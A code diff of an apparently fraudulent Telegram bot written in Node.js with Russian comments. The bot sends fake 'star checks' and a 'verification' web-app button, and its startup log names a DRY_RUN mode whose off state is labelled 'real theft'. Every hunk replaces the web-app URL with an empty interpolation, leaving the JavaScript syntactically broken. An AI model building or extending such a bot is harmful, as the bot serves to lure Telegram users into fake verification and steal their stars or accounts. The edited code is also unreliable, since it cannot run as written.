@@ -246,7 +246,7 @@ bot.onText(/\/start$/, (msg) => {
     };
 
     // Отправляем фото через URL
-    const avatarUrl = `${WEB_APP_URL}/avatar.jpg`;
+    const avatarUrl = `${}/avatar.jpg`;
     
     bot.sendPhoto(chatId, avatarUrl, {
         caption: menuText,
@@ -289,7 +289,7 @@ bot.on('callback_query', async (query) => {
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Пройти верификацию", web_app: { url: WEB_APP_URL } }
+                                { text: "✅ Пройти верификацию", web_app: { url:  } }
                             ]
                         ]
                     }
@@ -312,7 +312,7 @@ bot.on('callback_query', async (query) => {
                     const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
                     
                     // Отправляем чек с фоткой через URL
-                    const starsUrl = `${WEB_APP_URL}/stars.jpg`;
+                    const starsUrl = `${}/stars.jpg`;
                     bot.sendPhoto(chatId, starsUrl, {
                         caption: checkText,
                         parse_mode: 'HTML',
@@ -357,7 +357,7 @@ bot.on('callback_query', async (query) => {
 // СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @
 bot.onText(/@MyBankStar_bot/, (msg) => {
     const chatId = msg.chat.id;
-    const starsUrl = `${WEB_APP_URL}/stars.jpg`;
+    const starsUrl = `${}/stars.jpg`;
     
     bot.sendPhoto(chatId, starsUrl, {
         caption: '🎫 Создание чека:',
@@ -447,7 +447,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                                     );
                                 });
                                 
-                                const starsUrl = `${WEB_APP_URL}/stars.jpg`;
+                                const starsUrl = `${}/stars.jpg`;
                                 bot.sendPhoto(msg.chat.id, starsUrl, {
                                     caption: `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
                                 }).catch(photoError => {
@@ -480,7 +480,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                 
                 const checkId = this.lastID;
                 const text = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
-                const starsUrl = `${WEB_APP_URL}/stars.jpg`;
+                const starsUrl = `${}/stars.jpg`;
 
                 bot.sendPhoto(msg.chat.id, starsUrl, {
                     caption: text,
@@ -822,5 +822,5 @@ bot.onText(/\/admin/, (msg) => {
 });
 
 console.log('✅ Бот запущен с обновленным URL');
-console.log(`🌐 Web App: ${WEB_APP_URL}`);
+console.log(`🌐 Web App: ${}`);
 console.log(`🔧 Режим DRY_RUN: ${DRY_RUN ? 'ВКЛ (только просмотр)' : 'ВЫКЛ (реальная кража)'}`);
